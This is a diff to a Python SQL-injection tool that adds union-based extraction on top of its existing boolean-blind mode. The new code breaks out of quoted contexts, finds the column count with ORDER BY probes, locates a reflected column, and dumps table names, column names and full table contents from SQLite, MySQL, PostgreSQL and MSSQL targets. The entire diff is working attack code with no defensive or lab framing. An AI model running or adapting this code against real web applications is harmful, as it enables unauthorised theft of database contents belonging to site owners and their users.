@@ -11,6 +11,8 @@ Dependency-free (urllib). Boolean-blind only for now (the most universal case).
 from __future__ import annotations
 
 import difflib
+import html as _html
+import re
 from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit
 
 # Injection contexts: how to wrap an arbitrary boolean condition C around the
@@ -141,6 +143,17 @@ def calibrate(http, url, param, value, console=None):
     return None
 
 
+def _quote_for(context: str) -> str:
+    """The string-breakout quote implied by a calibrated context."""
+    if context.startswith("single"):
+        return "'"
+    if context.startswith("double"):
+        return '"'
+    if context.startswith("paren"):
+        return "')"
+    return ""                                # numeric
+
+
 def fingerprint(oracle) -> str:
     for name, cond in _FINGERPRINT:
         if oracle.ask(cond):
@@ -192,3 +205,100 @@ def dump(oracle, prof, table, cols, limit=20):
     for k in range(rows_n):
         rows.append([extract_str(oracle, prof, prof["cell_at"].format(c=c, t=table, k=k)) for c in cols])
     return rows
+
+
+# ============================ union-based ===============================
+# When the injection point reflects query output, UNION SELECT reads whole
+# values (and whole tables, via group_concat) in *one* request instead of
+# binary-searching each character — orders of magnitude faster than blind.
+
+_COMMENT = "-- -"          # the comment that swallows the rest of the original query
+_UMARK = "hKx9q"           # delimiter wrapped around extracted data
+_UROWSEP = "~r0w~"
+_UCOLSEP = "~c0l~"
+
+# Catalog sources per DBMS: "<column> FROM <rest>".
+_UFROM = {
+    "sqlite":   {"tables": "name FROM sqlite_master WHERE type='table'",
+                 "cols":   "name FROM pragma_table_info('{t}')"},
+    "mysql":    {"tables": "table_name FROM information_schema.tables WHERE table_schema=database()",
+                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database()"},
+    "postgres": {"tables": "table_name FROM information_schema.tables WHERE table_schema='public'",
+                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}'"},
+    "mssql":    {"tables": "table_name FROM information_schema.tables",
+                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}'"},
+}
+
+
+def _ucat(dbms, parts):
+    if dbms == "mysql":
+        return "concat(" + ",".join(parts) + ")"
+    return "(" + ("+" if dbms == "mssql" else "||").join(parts) + ")"
+
+
+def _uagg(dbms, expr):
+    if dbms == "mysql":
+        return f"group_concat({expr} SEPARATOR '{_UROWSEP}')"
+    if dbms == "sqlite":
+        return f"group_concat({expr},'{_UROWSEP}')"
+    return f"string_agg(cast({expr} as varchar(4000)),'{_UROWSEP}')"   # postgres / mssql
+
+
+def union_setup(http, oracle):
+    """Find the column count (ORDER BY) and a reflected column, or None."""
+    q = _quote_for(oracle.context)
+    base = _inject(http, oracle.url, oracle.param, oracle.value)
+    ncols = 0
+    for n in range(1, 16):
+        r = _inject(http, oracle.url, oracle.param, f"{oracle.value}{q} ORDER BY {n}{_COMMENT}")
+        if _sim(r, base) >= 0.95:
+            ncols = n
+        else:
+            break
+    if not ncols:
+        return None
+    marks = [f"{_UMARK}{i}z" for i in range(ncols)]
+    sel = ",".join(f"'{m}'" for m in marks)
+    r = _html.unescape(_inject(http, oracle.url, oracle.param,
+                               f"{oracle.value}{q} AND 1=2 UNION SELECT {sel}{_COMMENT}"))
+    refcol = next((i for i, m in enumerate(marks) if m in r), None)
+    return (ncols, refcol) if refcol is not None else None
+
+
+def union_value(http, oracle, dbms, ncols, refcol, expr):
+    """Extract one SQL expression's value in a single request."""
+    inner = f"({expr})"
+    if dbms in ("mssql", "postgres"):
+        inner = f"cast({inner} as varchar(4000))"
+    cols = ["NULL"] * ncols
+    cols[refcol] = _ucat(dbms, [f"'{_UMARK}'", inner, f"'{_UMARK}'"])
+    q = _quote_for(oracle.context)
+    payload = f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"
+    body = _html.unescape(_inject(http, oracle.url, oracle.param, payload))
+    m = re.search(re.escape(_UMARK) + "(.*?)" + re.escape(_UMARK), body, re.S)
+    return m.group(1) if m else ""
+
+
+def _union_list(http, oracle, dbms, ncols, refcol, which, **fmt):
+    col, _, frm = _UFROM[dbms][which].format(**fmt).partition(" FROM ")
+    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col)} FROM {frm}")
+    return [x for x in data.split(_UROWSEP) if x]
+
+
+def union_tables(http, oracle, dbms, ncols, refcol):
+    return _union_list(http, oracle, dbms, ncols, refcol, "tables")
+
+
+def union_columns(http, oracle, dbms, ncols, refcol, table):
+    return _union_list(http, oracle, dbms, ncols, refcol, "cols", t=table)
+
+
+def union_dump(http, oracle, dbms, ncols, refcol, table, cols):
+    parts = []
+    for i, c in enumerate(cols):
+        if i:
+            parts.append(f"'{_UCOLSEP}'")
+        parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
+    row = _ucat(dbms, parts)
+    data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row)} FROM {table}")
+    return [r.split(_UCOLSEP) for r in data.split(_UROWSEP) if r]
